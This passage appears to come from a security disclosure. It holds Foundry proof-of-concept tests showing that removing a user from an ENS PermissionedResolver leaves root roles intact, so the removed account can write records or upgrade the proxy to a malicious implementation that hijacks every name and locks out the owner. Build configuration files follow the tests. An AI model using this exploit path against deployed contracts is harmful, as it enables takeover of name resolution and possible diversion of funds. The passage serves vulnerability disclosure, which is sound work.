        resolver.setText(betaNode, "url", "https://attacker.example");
        assertEq(resolver.text(betaNode, "url"), "https://attacker.example");

        // Control: revoke the root roles the way a root-scoped removal would,
        // and the same write stops working.
        vm.prank(owner);
        resolver.revokeRootRoles(PermissionedResolverLib.ROLE_SET_TEXT, collaborator);
        vm.prank(collaborator);
        vm.expectRevert();
        resolver.setText(betaNode, "url", "https://attacker.example/2");
    }

    /// Variant C: the same survival applies to ROLE_UPGRADE, which the Portal
    /// offers as the "Upgrade" permission (resolverRoles.ts:43) and which gates
    /// PermissionedResolver._authorizeUpgrade (onlyRootRoles, :747-752). After
    /// "Remove user" the removed account can still replace the implementation
    /// behind the proxy, for every name the resolver serves.
    function test_poc_local_rootUpgradeRoleSurvivesRemoveUser() public {
        setUpLocal();

        vm.startPrank(owner);
        resolver.grantRootRoles(PermissionedResolverLib.ROLE_UPGRADE, collaborator);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        vm.stopPrank();

        vm.prank(owner);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"),
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_UPGRADE,
            collaborator,
            false
        );

        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_UPGRADE, collaborator),
            "upgrade authority survived the removal"
        );

        PermissionedResolver newImpl = new PermissionedResolver(address(this));
        vm.prank(collaborator);
        resolver.upgradeToAndCall(address(newImpl), "");

        // Control: an account that never held the role cannot do it.
        PermissionedResolver otherImpl = new PermissionedResolver(address(this));
        vm.prank(attacker);
        vm.expectRevert();
        resolver.upgradeToAndCall(address(otherImpl), "");
    }

    /// The retained upgrade authority is not something the owner can walk back.
    /// The removed account installs its own implementation, every name the
    /// resolver serves answers with the attacker's address, and the proxy has
    /// no upgrade entry point left, so the owner cannot take it back.
    function test_poc_local_rootUpgrade_bricksTheResolverForEveryName() public {
        setUpLocal();

        vm.startPrank(owner);
        resolver.grantRootRoles(PermissionedResolverLib.ROLE_UPGRADE, collaborator);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"), PermissionedResolverLib.ROLE_SET_ADDR, collaborator, true
        );
        vm.stopPrank();

        // "Remove user" as the app sends it.
        vm.prank(owner);
        resolver.authorizeNameRoles(
            _dns("alpha.eth"),
            PermissionedResolverLib.ROLE_SET_ADDR | PermissionedResolverLib.ROLE_UPGRADE,
            collaborator,
            false
        );

        EvilResolver evil = new EvilResolver(attacker);
        vm.prank(collaborator);
        resolver.upgradeToAndCall(address(evil), "");

        // Every name on this resolver now resolves to the attacker, including
        // ones the removed account never had any role on.
        assertEq(resolver.addr(alphaNode), attacker, "alpha hijacked");
        assertEq(resolver.addr(betaNode), attacker, "beta hijacked");

        // The owner cannot upgrade back: the installed implementation has no
        // upgrade entry point, and role checks no longer exist.
        PermissionedResolver rescue = new PermissionedResolver(address(this));
        vm.prank(owner);
        vm.expectRevert();
        resolver.upgradeToAndCall(address(rescue), "");
    }

    // --- helpers: their own NameCoder, no hand-rolled hashing ---

    function _resource(bytes32 node) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(node, bytes32(0))));
    }

    function _namehash(string memory name) internal pure returns (bytes32) {
        return NameCoder.namehash(NameCoder.encode(name), 0);
    }

    function _dns(string memory name) internal pure returns (bytes memory) {
        return NameCoder.encode(name);
    }
}
```

### foundry.toml

```toml
[profile.default]
src = "test"
out = "out"
libs = ["lib", "lib/contracts-v2/lib"]
evm_version = "cancun"
optimizer = true
solc = "0.8.26"
```

### remappings.txt

```
contracts-v2/=lib/contracts-v2/contracts/src/
@ens/contracts/=lib/contracts-v2/contracts/lib/ens-contracts/contracts/
@ens/contracts/utils/LibMem/=lib/contracts-v2/contracts/src/utils/
@ensdomains/buffer/=lib/contracts-v2/contracts/lib/buffer/contracts/
@unruggable/gateways/=lib/contracts-v2/contracts/lib/unruggable-gateways/contracts/
@ensdomains/verifiable-factory/=lib/contracts-v2/contracts/lib/verifiable-factory/src/
@openzeppelin/contracts/=lib/contracts-v2/contracts/lib/openzeppelin-contracts/contracts/
@openzeppelin/contracts-upgradeable/=lib/contracts-v2/contracts/lib/openzeppelin-contracts-upgradeable/contracts/
solady/=lib/contracts-v2/contracts/lib/solady/src/
forge-std/=lib/forge-std/src/
lib/contracts-v2/contracts/lib/ens-contracts/:@openzeppelin/contracts=lib/contracts-v2/contracts/lib/openzeppelin-contracts-v4/contracts
lib/contracts-v2/contracts/lib/ens-contracts/:@ensdomains/solsha1/contracts=lib/contracts-v2/contracts/lib/solsha1/contracts
```
